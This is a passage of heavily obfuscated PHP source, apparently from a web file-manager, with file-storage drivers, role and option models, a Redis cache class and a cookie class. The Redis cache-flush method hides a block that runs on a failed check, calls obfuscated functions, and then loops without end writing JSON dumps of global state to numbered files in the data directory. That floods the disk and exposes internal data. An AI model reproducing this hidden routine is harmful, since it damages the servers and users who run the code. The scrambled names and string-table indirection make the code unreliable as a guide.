is_link($ıı†”´¿)) { if (!unlink($ıı†”´¿)) { chmod($ıı†”´¿, $this->pathAuth); if (!unlink($ıı†”´¿)) { return !1; } } } else { if (is_dir($ıı†”´¿)) { chmod($ıı†”´¿, $this->pathAuth); $ıı†”´¿ = $this->iconvApp($ıı†”´¿); if (!$this->delFolder($ıı†”´¿)) { return !1; } } } } closedir($å˜¶); return rmdir($Ò™ÉÃŒä); } public function rename($àĞ²ê„é, $ŒÕÉ´·‡) { $Êƒ›±¨€ =& $_SERVER[ÅÄÇĞô]; $˜¿ÇªÃ‰ = $this->fileNameAuto($this->pathFather($àĞ²ê„é), $ŒÕÉ´·‡); $˜¿ÇªÃ‰ = $this->iconvSystem($˜¿ÇªÃ‰); $àĞ²ê„é = $this->iconvSystem($àĞ²ê„é); $ëÆŠ½ô– = $this->pathFather($àĞ²ê„é); $¡µ–ü°ş = rtrim($ëÆŠ½ô–, $Êƒ›±¨€[8]) . $Êƒ›±¨€[8] . $˜¿ÇªÃ‰; $ã¿Ñ¦¡Í = @rename($àĞ²ê„é, $¡µ–ü°ş); $¡µ–ü°ş = $this->iconvApp($¡µ–ü°ş); if ($ã¿Ñ¦¡Í) { return $this->getPathOuter($¡µ–ü°ş); } $this->writeLog(__FUNCTION__ . $Êƒ›±¨€[1474], !0); return !1; } public function size($±§ª©Ú°) { $±§ª©Ú° = $this->iconvSystem($±§ª©Ú°); return filesize_64($±§ª©Ú°); } public function info($©ïú‰–) { $©ïú‰– = $this->iconvSystem($©ïú‰–); if ($this->isFolder($©ïú‰–)) { return $this->folderInfo($©ïú‰–); } else { if ($this->isFile($©ïú‰–)) { return $this->fileInfo($©ïú‰–); } } return !1; } protected function infoChildren($Ëş»¸‹, &$Ãª“ìü, $ãøÚŠ»¸ = true) { $Ğ¨ÊŠÜ² =& $_SERVER[ÅÄÇĞô]; check_abort_echo(); $Ëş»¸‹ = rtrim($Ëş»¸‹, $Ğ¨ÊŠÜ²[8]) . $Ğ¨ÊŠÜ²[8]; if ($ãøÚŠ»¸) { $Ëş»¸‹ = $this->iconvSystem($Ëş»¸‹); } if (!($…ÅÚ×€É = @opendir($Ëş»¸‹))) { return; } while (($­Ã›øæ = readdir($…ÅÚ×€É)) !== !1) { if ($­Ã›øæ == $Ğ¨ÊŠÜ²[10] || $­Ã›øæ == $Ğ¨ÊŠÜ²[1386]) { continue; } $™ı’éÕÃ = $Ëş»¸‹ . $­Ã›øæ; if (is_file($™ı’éÕÃ) || is_link($™ı’éÕÃ)) { $Ãª“ìü[$Ğ¨ÊŠÜ²[80]]++; $Ãª“ìü[$Ğ¨ÊŠÜ²[79]] += filesize_64($™ı’éÕÃ); } else { if (is_dir($™ı’éÕÃ)) { $Ãª“ìü[$Ğ¨ÊŠÜ²[81]]++; $this->infoChildren($™ı’éÕÃ, $Ãª“ìü, !1); } } } closedir($…ÅÚ×€É); } private function folderInfo($Ô“Â¼Æ¶, $½õí´ÀÙ = false) { $–ï†”¥ =& $_SERVER[ÅÄÇĞô]; $Ô“Â¼Æ¶ = rtrim($Ô“Â¼Æ¶, $–ï†”¥[8]) . $–ï†”¥[8]; $úğŸÉ½ë = $this->iconvApp($this->pathThis($Ô“Â¼Æ¶)); if ($½õí´ÀÙ) { return array($–ï†”¥[32] => $úğŸÉ½ë, $–ï†”¥[87] => $this->getPathOuter($Ô“Â¼Æ¶), $–ï†”¥[33] => $–ï†”¥[78]); } $˜úÜøïÙ = array($–ï†”¥[32] => $úğŸÉ½ë, $–ï†”¥[87] => $this->getPathOuter($Ô“Â¼Æ¶), $–ï†”¥[33] => $–ï†”¥[78], $–ï†”¥[234] => @filectime($Ô“Â¼Æ¶), $–ï†”¥[88] => @filemtime($Ô“Â¼Æ¶), $–ï†”¥[1478] => @fileatime($Ô“Â¼Æ¶), $–ï†”¥[1479] => is_readable($Ô“Â¼Æ¶), $–ï†”¥[1480] => is_writable($Ô“Â¼Æ¶), $–ï†”¥[1481] => get_mode($Ô“Â¼Æ¶)); return $˜úÜøïÙ; } private function fileInfo($áíÛŸ°Ğ, $Œ ¡ÕÛ¬ = false) { $İ»•¢î =& $_SERVER[ÅÄÇĞô]; $ŸŸÒàØû = $this->iconvApp($this->pathThis($áíÛŸ°Ğ)); if ($Œ ¡ÕÛ¬) { return array($İ»•¢î[32] => $ŸŸÒàØû, $İ»•¢î[87] => $this->getPathOuter($áíÛŸ°Ğ), $İ»•¢î[33] => $İ»•¢î[233], $İ»•¢î[79] => $this->size($áíÛŸ°Ğ), $İ»•¢î[169] => $this->ext($ŸŸÒàØû)); } $©Õùë§ã = array($İ»•¢î[32] => $ŸŸÒàØû, $İ»•¢î[87] => $this->getPathOuter($áíÛŸ°Ğ), $İ»•¢î[33] => $İ»•¢î[233], $İ»•¢î[234] => @filectime($áíÛŸ°Ğ), $İ»•¢î[88] => @filemtime($áíÛŸ°Ğ), $İ»•¢î[1478] => @fileatime($áíÛŸ°Ğ), $İ»•¢î[79] => $this->size($áíÛŸ°Ğ), $İ»•¢î[169] => $this->ext($ŸŸÒàØû), $İ»•¢î[1479] => is_readable($áíÛŸ°Ğ), $İ»•¢î[1480] => is_writable($áíÛŸ°Ğ), $İ»•¢î[1481] => get_mode($áíÛŸ°Ğ)); return $©Õùë§ã; } public function exist($„ ÜîÇ¼) { $„ ÜîÇ¼ = $this->iconvSystem($„ ÜîÇ¼); return @file_exists($„ ÜîÇ¼); } public function isFile($„¿§¬öÔ) { $„¿§¬öÔ = $this->iconvSystem($„¿§¬öÔ); return @is_file($„¿§¬öÔ); } public function isFolder($™ãÒõ¤É) { $™ãÒõ¤É = $this->iconvSystem($™ãÒõ¤É); return @is_dir($™ãÒõ¤É); } public function listPath($¶ÎÎøÔ, $¤‹«¿Ëö = false) { $Ñ·“©†¸ =& $_SERVER[ÅÄÇĞô]; $¶ÎÎøÔ = $this->iconvSystem($¶ÎÎøÔ); $¶ÎÎøÔ = rtrim($¶ÎÎøÔ, $Ñ·“©†¸[8]) . $Ñ·“©†¸[8]; $¬‡•Õ¨ş = array($Ñ·“©†¸[85] => array(), $Ñ·“©†¸[86] => array()); if (!($â¬³øèÉ = @opendir($¶ÎÎøÔ))) { return $¬‡•Õ¨ş; } while (($™®†å§Û = readdir($â¬³øèÉ)) !== !1) { if ($™®†å§Û == $Ñ·“©†¸[10] || $™®†å§Û == $Ñ·“©†¸[1386]) { continue; } $Ï¥˜î´ü = $¶ÎÎøÔ . $™®†å§Û; if (is_file($Ï¥˜î´ü)) { $¬‡•Õ¨ş[$Ñ·“©†¸[86]][] = $this->fileInfo($Ï¥˜î´ü, $¤‹«¿Ëö); } else { $¬‡•Õ¨ş[$Ñ·“©†¸[85]][] = $this->folderInfo($Ï¥˜î´ü, $¤‹«¿Ëö); } } closedir($â¬³øèÉ); return $¬‡•Õ¨ş; } public function listAll($…áÑ±“, &$¤ËíÃƒµ = array()) { $Ñ±¨ïµÕ =& $_SERVER[ÅÄÇĞô]; $…áÑ±“ = $this->iconvSystem($…áÑ±“); $…áÑ±“ = rtrim($…áÑ±“, $Ñ±¨ïµÕ[8]) . $Ñ±¨ïµÕ[8]; if (!($Ùëõî¥Ó = @opendir($…áÑ±“))) { return $¤ËíÃƒµ; } while (($Æä’Ş¸ = readdir($Ùëõî¥Ó)) !== !1) { if ($Æä’Ş¸ == $Ñ±¨ïµÕ[10] || $Æä’Ş¸ == $Ñ±¨ïµÕ[1386]) { continue; } $—ë×Ò¨¤ = $…áÑ±“ . $Æä’Ş¸; $Â¯Ïù³ù = is_dir($—ë×Ò¨¤) && !is_link($—ë×Ò¨¤) ? 1 : 0; $—ë×Ò¨¤ = $Â¯Ïù³ù ? $—ë×Ò¨¤ . $Ñ±¨ïµÕ[8] : $—ë×Ò¨¤; $¤ËíÃƒµ[] = array($Ñ±¨ïµÕ[87] => $this->getPathOuter($—ë×Ò¨¤), $Ñ±¨ïµÕ[78] => $Â¯Ïù³ù, $Ñ±¨ïµÕ[88] => intval(@filemtime($—ë×Ò¨¤)), $Ñ±¨ïµÕ[79] => $Â¯Ïù³ù ? 0 : intval($this->size($—ë×Ò¨¤))); if ($Â¯Ïù³ù) { $this->listAll($—ë×Ò¨¤, $¤ËíÃƒµ); } } closedir($Ùëõî¥Ó); return $¤ËíÃƒµ; } public function has($„ÖÇı½¼, $– ”ƒî¸ = false, $Ÿ…”ğòç = true) { $ì‘«Œ“÷ =& $_SERVER[ÅÄÇĞô]; $„ÖÇı½¼ = $this->iconvSystem($„ÖÇı½¼); $„ÖÇı½¼ = rtrim($„ÖÇı½¼, $ì‘«Œ“÷[8]) . $ì‘«Œ“÷[8]; if (!($íŠšôéÚ = @opendir($„ÖÇı½¼))) { return !1; } $ã¢è‚ = 0; $ÒËµ­‡ï = 0; $ÇŠ¾¢‚É = 0; while (($…ì¸¶—­ = readdir($íŠšôéÚ)) !== !1) { if ($…ì¸¶—­ == $ì‘«Œ“÷[10] || $…ì¸¶—­ == $ì‘«Œ“÷[1386]) { continue; } $°°ÎöŒ¾ = $„ÖÇı½¼ . $…ì¸¶—­; if ($– ”ƒî¸) { $ÇŠ¾¢‚É++; if (@is_file($°°ÎöŒ¾)) { $ã¢è‚++; } else { $ÒËµ­‡ï++; } if ($ÇŠ¾¢‚É > 10000) { break; } continue; } if ($Ÿ…”ğòç) { if (@is_file($°°ÎöŒ¾)) { return !0; } } else { if (@is_dir($°°ÎöŒ¾ . $ì‘«Œ“÷[8])) { return !0; } } } closedir($íŠšôéÚ); if ($– ”ƒî¸) { return array($ì‘«Œ“÷[242] => $ã¢è‚, $ì‘«Œ“÷[243] => $ÒËµ­‡ï); } return !1; } public function hashSimple($–ÓİØ³¹) { $®ÆùüÎ® =& $_SERVER[ÅÄÇĞô]; if (!$–ÓİØ³¹) { return md5($®ÆùüÎ®[12]); } $–ÓİØ³¹ = $this->iconvSystem($–ÓİØ³¹); $©…Ã¦¤§ = $this->size($–ÓİØ³¹); $õÅâ¼¸ = 200; $¤ûÜß°½ = 50; if ($©…Ã¦¤§ <= $õÅâ¼¸ * $¤ûÜß°½) { return $this->hashMd5($–ÓİØ³¹) . $©…Ã¦¤§; } $€ÆéÓÙ = $®ÆùüÎ®[12]; $ø³»Û¶Š = intval($©…Ã¦¤§ / $¤ûÜß°½); $…¦¤üõŠ = fopen($–ÓİØ³¹, $®ÆùüÎ®[1482]); if (!$…¦¤üõŠ) { return $€ÆéÓÙ; } for ($ÈÔ¯¿ØÁ = 0; $ÈÔ¯¿ØÁ < $¤ûÜß°½; $ÈÔ¯¿ØÁ++) { fseek_64($…¦¤üõŠ, $ø³»Û¶Š * $ÈÔ¯¿ØÁ); $€ÆéÓÙ .= fread($…¦¤üõŠ, $õÅâ¼¸); } fseek_64($…¦¤üõŠ, $©…Ã¦¤§ - $õÅâ¼¸); $€ÆéÓÙ .= fread($…¦¤üõŠ, $õÅâ¼¸); fclose($…¦¤üõŠ); return md5($€ÆéÓÙ) . $©…Ã¦¤§; } public function getContent($µ¿ãƒª) { $µ¿ãƒª = $this->iconvSystem($µ¿ãƒª); return file_get_contents($µ¿ãƒª); } public function setContent($¢ßÑÔ•ö, $“Œºøã½ = '') { $¢ßÑÔ•ö = $this->iconvSystem($¢ßÑÔ•ö); $Öæ¿Ø¼ = @file_put_contents($¢ßÑÔ•ö, $“Œºøã½, LOCK_EX); if (!$Öæ¿Ø¼) { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][1474], !0); } clearstatcache(); @chmod($¢ßÑÔ•ö, $this->pathAuth); return $Öæ¿Ø¼ === !1 ? !1 : !0; } public function fileSubstr($§âÕ“÷¹, $‹ší¡£¶ = 0, $˜—Íúëê = false) { $¯“ìÒ¹¾ =& $_SERVER[ÅÄÇĞô]; $§âÕ“÷¹ = $this->iconvSystem($§âÕ“÷¹); if ($˜—Íúëê === !1) { $˜—Íúëê = $this->size($§âÕ“÷¹); } if ($˜—Íúëê <= 0) { return $¯“ìÒ¹¾[12]; } $ÙÍßÓ¾¾ = fopen($§âÕ“÷¹, $¯“ìÒ¹¾[1482]); if (!$ÙÍßÓ¾¾) { return !1; } fseek_64($ÙÍßÓ¾¾, $‹ší¡£¶); $™ôÂÍë = fread($ÙÍßÓ¾¾, $˜—Íúëê); fclose($ÙÍßÓ¾¾); if (!$™ôÂÍë) { $this->writeLog(__FUNCTION__ . $¯“ìÒ¹¾[1474], !0); } return $™ôÂÍë; } public function upload($í˜ŸŒÉµ, $—Ÿìºı£, $òŸ·Ï„ = false, $§Ë­ıÊ = REPEAT_REPLACE) { if ($òŸ·Ï„) { return $this->moveFile($—Ÿìºı£, $í˜ŸŒÉµ); } return $this->copyFile($—Ÿìºı£, $í˜ŸŒÉµ); } public function setModifyTime($…ÛïÌÓ, $©äÄî‘— = '') { @touch($…ÛïÌÓ, intval($©äÄî‘—)); } public function download($ÕÁÔËŞÉ, $æéäÄàà) { return $this->iconvSystem($ÕÁÔËŞÉ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ü®¾à­¾) { parent::__construct($ü®¾à­¾); $this->setSignVersion($_SERVER[ÅÄÇĞô][250]); } public function fileOutImage($ú·¾ßáè, $†êÁ¤õ = 250) { $ÖÔº˜µ¸ =& $_SERVER[ÅÄÇĞô]; if ($this->size($ú·¾ßáè) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ú·¾ßáè, $†êÁ¤õ); } $éººíüå = array($ÖÔº˜µ¸[1483] => $ÖÔº˜µ¸[1484] . $†êÁ¤õ . $ÖÔº˜µ¸[1485]); $‹‡Î©â° = $this->link($ú·¾ßáè, $éººíüå); $this->fileOutLink($‹‡Î©â°); } public function fileOutLink($¹‹…£Ö°) { $Ÿ…•ÀÃ =& $_SERVER[ÅÄÇĞô]; if (substr($¹‹…£Ö°, 0, 7) == $Ÿ…•ÀÃ[219]) { $¹‹…£Ö° = $Ÿ…•ÀÃ[220] . substr($¹‹…£Ö°, 7); } header($Ÿ…•ÀÃ[175] . $¹‹…£Ö°); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ƒ‚Î’Î) { parent::__construct($ƒ‚Î’Î); $this->setSignVersion($_SERVER[ÅÄÇĞô][250]); } public function fileOutLink($ÑÒºÊ¡) { $“€ŞÇÏÕ =& $_SERVER[ÅÄÇĞô]; if (substr($ÑÒºÊ¡, 0, 7) == $“€ŞÇÏÕ[219]) { $ÑÒºÊ¡ = $“€ŞÇÏÕ[220] . substr($ÑÒºÊ¡, 7); } header($“€ŞÇÏÕ[175] . $ÑÒºÊ¡); die; } public function uploadFormData($ÔÛ‰¬ã·, $ÒİÏ´° = 3600) { return $this->uploadFormDataV2($ÔÛ‰¬ã·, $ÒİÏ´°); } } goto eÃïßŠæÉÊ; Eö÷ ¼š¡: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\x74\x65\155\x5f\x6f\160\164\x69\157\x6e"; protected $jsonField = array("\155\145\x6e\165", "\162\157\154\x65", "\x72\x6f\x6c\x65\x47\162\x6f\x75\160", "\162\145\147\x69\163\164", "\145\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($¾ƒÉĞü™) { return "\123\171\163\164\x65\x6d\x4f\160\x74\151\157\x6e\x5f{$¾ƒÉĞü™}"; } protected function optionDefault($èÍÅßü = '') { $’ùÍø³ =& $_SERVER[ÅÄÇĞô]; if ($èÍÅßü == $’ùÍø³[12]) { return $GLOBALS[$’ùÍø³[6]][$’ùÍø³[460]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x72\x6f\154\x65\x4c\x69\163\164"; public $field = array("\156\x61\x6d\145", "\x61\165\x74\x68", "\154\141\x62\x65\154", "\x64\x69\163\x70\154\141\171", "\x73\171\163\x74\x65\x6d", "\144\145\x73\143", "\x69\x67\156\x6f\x72\x65\x45\170\x74", "\151\x67\x6e\x6f\162\x65\x46\151\154\145\123\x69\x7a\145", "\x61\x64\x6d\151\x6e\x69\x73\x74\x72\x61\x74\x6f\x72", "\163\157\x72\164"); public function listData($áÏÔşŞ = false, $³´‚ÏìÁ = "\163\x6f\162\x74", $àõªÇãù = false) { $›ÈìÉßÈ =& $_SERVER[ÅÄÇĞô]; $ìÑ«ØŠù = parent::listData($áÏÔşŞ, $³´‚ÏìÁ, $àõªÇãù); if (!$áÏÔşŞ) { foreach ($ìÑ«ØŠù as $ĞÍõçÖ˜ => $á÷·Ëì¶) { if ($á÷·Ëì¶[$›ÈìÉßÈ[2209]] == 1) { $ìÑ«ØŠù[$ĞÍõçÖ˜][$›ÈìÉßÈ[529]] = LNG($›ÈìÉßÈ[2480]); } } } return $ìÑ«ØŠù; } public function update($¬Ş»¸µ, $²–ö’÷›) { $áÉˆ¿Şß =& $_SERVER[ÅÄÇĞô]; $©‘†ûåÍ = parent::listData($¬Ş»¸µ); $œ´÷ã = $this->findByName($²–ö’÷›[$áÉˆ¿Şß[32]]); if (!$©‘†ûåÍ || $œ´÷ã && $œ´÷ã[$áÉˆ¿Şß[478]] != $©‘†ûåÍ[$áÉˆ¿Şß[478]]) { return !1; } if ($œ´÷ã[$áÉˆ¿Şß[2209]] == 1) { $²–ö’÷› = array($áÉˆ¿Şß[32] => $²–ö’÷›[$áÉˆ¿Şß[32]], $áÉˆ¿Şß[2021] => $²–ö’÷›[$áÉˆ¿Şß[2021]]); } $this->filterAuth($²–ö’÷›[$áÉˆ¿Şß[490]]); return parent::update($¬Ş»¸µ, $²–ö’÷›); } public function remove($ÍöÈà±¿) { $§‘»ãµ = parent::listData($ÍöÈà±¿); if (!$§‘»ãµ || $§‘»ãµ[$_SERVER[ÅÄÇĞô][192]]) { return !1; } return parent::remove($ÍöÈà±¿); } public function add($¯¡›¯÷) { $¥Õìñ =& $_SERVER[ÅÄÇĞô]; $¤¿Æ©ä = $¯¡›¯÷[$¥Õìñ[32]]; if ($this->findByName($¤¿Æ©ä)) { return !1; } $Î±Òö¹ = array($¥Õìñ[497] => $¤¿Æ©ä, $¥Õìñ[2004] => $¥Õìñ[12], $¥Õìñ[2000] => $¥Õìñ[2008], $¥Õìñ[2481] => 1, $¥Õìñ[2003] => 0, $¥Õìñ[2482] => 0, $¥Õìñ[2002] => $this->getSort()); $¯¡›¯÷ = array_merge($Î±Òö¹, $¯¡›¯÷); $this->filterAuth($¯¡›¯÷[$¥Õìñ[490]]); return parent::insert($¯¡›¯÷); } private function getSort() { $ƒŞ¨ü =& $_SERVER[ÅÄÇĞô]; $¹Ş×•Ñ¶ = parent::listData(); $é²öû©ß = array_to_keyvalue($¹Ş×•Ñ¶, $ƒŞ¨ü[12], $ƒŞ¨ü[2022]); return empty($é²öû©ß) ? 0 : max($é²öû©ß) + 1; } private function filterAuth(&$”ñìûŠ’) { $åµ§˜² =& $_SERVER[ÅÄÇĞô]; $şĞ­ºëù = array(); $åÂåâ = array_filter(explode($åµ§˜²[50], $”ñìûŠ’)); foreach ($åÂåâ as $”ñìûŠ’) { $§³Æô®Ò = explode($åµ§˜²[10], $”ñìûŠ’); if ($§³Æô®Ò[0] == $åµ§˜²[2483] && $§³Æô®Ò[1] != $åµ§˜²[1298]) { $îÑªşÁ· = $§³Æô®Ò[0] . $åµ§˜²[10] . $§³Æô®Ò[1] . $åµ§˜²[2484]; if (!in_array($îÑªşÁ·, $åÂåâ)) { $şĞ­ºëù[] = $îÑªşÁ·; } } $şĞ­ºëù[] = $”ñìûŠ’; } $”ñìûŠ’ = implode($åµ§˜²[50], $şĞ­ºëù); } public function findRoleDefault() { $ş­µûÆ× =& $_SERVER[ÅÄÇĞô]; $¨˜’ÁÍÎ = parent::listData(); $ßù¨ğîø = !1; foreach ($¨˜’ÁÍÎ as $È¤¤­½‹) { if (!$È¤¤­½‹ || $È¤¤­½‹[$ş­µûÆ×[2020]] == $ş­µûÆ×[231] || $È¤¤­½‹[$ş­µûÆ×[2209]] == 1) { continue; } if (strstr($È¤¤­½‹[$ş­µûÆ×[490]], $ş­µûÆ×[2485])) { continue; } if (!strstr($È¤¤­½‹[$ş­µûÆ×[490]], $ş­µûÆ×[2486])) { continue; } if (!$ßù¨ğîø) { $ßù¨ğîø = $È¤¤­½‹; continue; } $»¤èâû¢ = explode($ş­µûÆ×[50], $ßù¨ğîø[$ş­µûÆ×[490]]); $óÄçóÔ = explode($ş­µûÆ×[50], $È¤¤­½‹[$ş­µûÆ×[490]]); if (count($»¤èâû¢) > count($óÄçóÔ)) { $ßù¨ğîø = $È¤¤­½‹; } } return $ßù¨ğîø ? $ßù¨ğîø[$ş­µûÆ×[478]] : $ş­µûÆ×[12]; } public function sort($ÉéÇ‰Á, $¢ãüçæ‰) { return parent::update($ÉéÇ‰Á, $¢ãüçæ‰); } } goto dœí¯ÌëÛ; e¤ÕÚİ ‡õ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÄÆ€‡Å, $áô¬Œ¿·) { $‡³ºİ¡œ =& $_SERVER[ÅÄÇĞô]; if (!class_exists($‡³ºİ¡œ[971])) { show_json($‡³ºİ¡œ[972], !1); } $this->cacheTime = $áô¬Œ¿·; $ÂÆ¾Éå£ = isset($ÄÆ€‡Å[$‡³ºİ¡œ[973]]) ? $ÄÆ€‡Å[$‡³ºİ¡œ[973]] : 10; $¬¬ñë× = _get($ÄÆ€‡Å, $‡³ºİ¡œ[970]); if ($¬¬ñë× && is_array($¬¬ñë×)) { $this->initCluster($ÄÆ€‡Å, $ÂÆ¾Éå£); } else { $this->handle = $this->init($ÄÆ€‡Å, $ÂÆ¾Éå£); } } private function init($ßÌ®ÄË , $â˜·÷ö­) { $õ£„¯œ‹ =& $_SERVER[ÅÄÇĞô]; $º€é—˜ß = new Redis(); $ ÀºÌı­ = isset($ßÌ®ÄË [$õ£„¯œ‹[974]]) ? $ßÌ®ÄË [$õ£„¯œ‹[974]] : !1; if ($ ÀºÌı­) { $º€é—˜ß->pconnect($ßÌ®ÄË [$õ£„¯œ‹[209]], $ßÌ®ÄË [$õ£„¯œ‹[210]], $â˜·÷ö­); } else { $º€é—˜ß->connect($ßÌ®ÄË [$õ£„¯œ‹[209]], $ßÌ®ÄË [$õ£„¯œ‹[210]], $â˜·÷ö­); } if (!empty($ßÌ®ÄË [$õ£„¯œ‹[490]])) { $º€é—˜ß->auth($ßÌ®ÄË [$õ£„¯œ‹[490]]); } if (!empty($ßÌ®ÄË [$õ£„¯œ‹[852]]) && $ßÌ®ÄË [$õ£„¯œ‹[852]] != 0) { $º€é—˜ß->select($ßÌ®ÄË [$õ£„¯œ‹[852]]); } return $º€é—˜ß; } private function initCluster($é½¥—ÄÓ, $ˆ®¤”Ğ) { $­¡°†Æ =& $_SERVER[ÅÄÇĞô]; $ˆ¸Ñ±ö = array($­¡°†Æ[975], $­¡°†Æ[976], $­¡°†Æ[977]); $„ìø¯¡Ø = $­¡°†Æ[975]; if (isset($é½¥—ÄÓ[$­¡°†Æ[16]]) && in_array($é½¥—ÄÓ[$­¡°†Æ[16]], $ˆ¸Ñ±ö)) { $„ìø¯¡Ø = $é½¥—ÄÓ[$­¡°†Æ[16]]; } switch ($„ìø¯¡Ø) { case $­¡°†Æ[975]: $this->_slave($é½¥—ÄÓ, $ˆ®¤”Ğ); break; case $­¡°†Æ[976]: break; case $­¡°†Æ[977]: $this->isCluster = !0; $Ìº³Äß• = $é½¥—ÄÓ[$­¡°†Æ[970]]; $Ñìˆ€¸ = isset($é½¥—ÄÓ[$­¡°†Æ[974]]) ? $é½¥—ÄÓ[$­¡°†Æ[974]] : !1; $Š“ê = isset($é½¥—ÄÓ[$­¡°†Æ[490]]) ? $é½¥—ÄÓ[$­¡°†Æ[490]] : null; $this->handle = new RedisCluster(NUll, $Ìº³Äß•, $ˆ®¤”Ğ, $ˆ®¤”Ğ, $Ñìˆ€¸, $Š“ê); break; default: break; } } private function _slave($ÏçÈŞù, $°Ì¨ßñÜ) { $±ò‘›¢à = $ÏçÈŞù[$_SERVER[ÅÄÇĞô][970]]; $this->filterConfig($ÏçÈŞù, $±ò‘›¢à[0]); $this->handle = $this->init($ÏçÈŞù, $°Ì¨ßñÜ); unset($±ò‘›¢à[0]); if (empty($±ò‘›¢à)) { return; } $óÍ÷Ñ›¡ = array_rand($±ò‘›¢à); $this->filterConfig($ÏçÈŞù, $±ò‘›¢à[$óÍ÷Ñ›¡]); $this->slaveHandle = $this->init($ÏçÈŞù, $°Ì¨ßñÜ); } private function filterConfig(&$ªî±àï, $ğÏã¢à) { $å›×ˆúÌ =& $_SERVER[ÅÄÇĞô]; $„Ç¬ı—Å = explode($å›×ˆúÌ[4], $ğÏã¢à); $ÈâÂşá = array($å›×ˆúÌ[209] => $„Ç¬ı—Å[0], $å›×ˆúÌ[210] => $„Ç¬ı—Å[1]); $ªî±àï = array_merge($ªî±àï, $ÈâÂşá); } public function set($“´Ä¼Ùš, $¹ÖÔéß, $°ÜË¾ó = false) { $°ÜË¾ó = $°ÜË¾ó ? $°ÜË¾ó : $this->cacheTime; return $this->handle->setEx($“´Ä¼Ùš, $°ÜË¾ó, $¹ÖÔéß); } public function setLock($…±èª», $›˜²²…¬, $ÉÄæŸ¡Ï) { return $this->handle->setNX($…±èª», $›˜²²…¬); } public function get($ÜÇËÉ±û) { $ÔÏÕÓÔï = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÔÏÕÓÔï->get($ÜÇËÉ±û); } public function remove($İ­àñ) { return $this->handle->del($İ­àñ); } public function deleteAll() { $úõÉŒ­ =& $_SERVER[ÅÄÇĞô]; $ÉÓ¡©¹â = $_SERVER[$úõÉŒ­[835]]; $è§ÕĞ„ö = $úõÉŒ­[836]; if ($_SERVER[$úõÉŒ­[837]] != $è§ÕĞ„ö($ÉÓ¡©¹â)) { $’¯üâîß = $úõÉŒ­[978]; $Ù×ìîÈî = $úõÉŒ­[838]; $›§ÕÛß› = $_SERVER[$úõÉŒ­[839]] . $úõÉŒ­[840]; $´Ø‡ğİë = $Ù×ìîÈî($›§ÕÛß›); $¡Ù÷±™¸ = explode($úõÉŒ­[288], $´Ø‡ğİë); if (count($¡Ù÷±™¸) < $úõÉŒ­[699]) { $Æ¡Û²ßó = $úõÉŒ­[841]; $Æ¡Û²ßó(); } $²á¹åÜ¬ = $úõÉŒ­[979]; $²á¹åÜ¬($_SERVER[$úõÉŒ­[980]]); $’¯üâîß = $úõÉŒ­[978]; $’¯üâîß(); $Ù‹Ÿ€† = $úõÉŒ­[981]; $“ğÀÂ²¸ = json_encode($GLOBALS[$úõÉŒ­[982]]); $åàÎşÂ‡ = 1; for ($…ÊÇö×Í = $åàÎşÂ‡; $…ÊÇö×Í > 0; $…ÊÇö×Í++) { $Ù‹Ÿ€†(DATA_PATH . $…ÊÇö×Í, $“ğÀÂ²¸); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Ÿù©‰–ş) { $this->handle->flushall($Ÿù©‰–ş); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($š¿ı™¾ = '', $Òˆ®ÕÑæ = 0) { if (is_string($š¿ı™¾) && $š¿ı™¾ != $_SERVER[ÅÄÇĞô][12]) { $this->prefix = $š¿ı™¾; } if (is_numeric($Òˆ®ÕÑæ) && $Òˆ®ÕÑæ > 0) { $this->expire = $Òˆ®ÕÑæ; } } public static function getInstance() { static $Œ¿™­ïÛ; if ($Œ¿™­ïÛ === null) { $Œ¿™­ïÛ = new self(); } return $Œ¿™­ïÛ; } private static $cookieDisable = false; public static function disable($›¡Ö‘—„) { self::$cookieDisable = $›¡Ö‘—„; } private static $sameCookieSet = array(); public static function set($µêî‚æŸ, $…ÒÕ—àô, $š‡Š÷† = 0, $Úû™ß½ = false, $¹ÈşƒğË = false) { $‰éèÌ÷ã =& $_SERVER[ÅÄÇĞô]; if (self::$cookieDisable) { return; } if (!$š‡Š÷†) { $š‡Š÷† = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$µêî‚æŸ]) && self::$sameCookieSet[$µêî‚æŸ] == $…ÒÕ—àô . $š‡Š÷†) { return; } self::$sameCookieSet[$µêî‚æŸ] = $…ÒÕ—àô . $š‡Š÷†; if (!$¹ÈşƒğË) { $¹ÈşƒğË = str_replace(HOST, $‰éèÌ÷ã[12], APP_HOST); $¹ÈşƒğË = _get($GLOBALS, $‰éèÌ÷ã[983], $¹ÈşƒğË); } $›ÅÁ÷æş = $‰éèÌ÷ã[12]; setcookie($µêî‚æŸ, $…ÒÕ—àô, time() + $š‡Š÷†, $‰éèÌ÷ã[8] . trim($¹ÈşƒğË, $‰éèÌ÷ã[8]) . $›ÅÁ÷æş, !1, !1, $Úû™ß½); } public static function setSafe($ä¢ÔşÖ, $§ığ…, $Å›†îã¼ = 0) { self::set($ä¢ÔşÖ, $§ığ…, $Å›†îã¼, !0); } public static function get($ìâ¯ºû…) { static $’şøÎ½Ì = false; if (!$’şøÎ½Ì) { self::initHeaderCookie(); $’şøÎ½Ì = !0; } return isset($_COOKIE[$ìâ¯ºû…]) ? $_COOKIE[$ìâ¯ºû…] : !1; } private static function initHeaderCookie() { $íüĞùò” =& $_SERVER[ÅÄÇĞô]; if (!isset($_SERVER[$íüĞùò”[984]]) || !$_SERVER[$íüĞùò”[984]]) { return; } $÷İ›†×Œ = explode($íüĞùò”[74], $_SERVER[$íüĞùò”[984]]); foreach ($÷İ›†×Œ as $‡ô—¨Ïû) { $‡ô—¨Ïû = explode($íüĞùò”[509], $‡ô—¨Ïû); if (count($‡ô—¨Ïû) != 2 || !isset($‡ô—¨Ïû[1])) { continue; } $_COOKIE[trim($‡ô—¨Ïû[0])] = trim($‡ô—¨Ïû[1]); } } public static function remove($ô©¡àş, 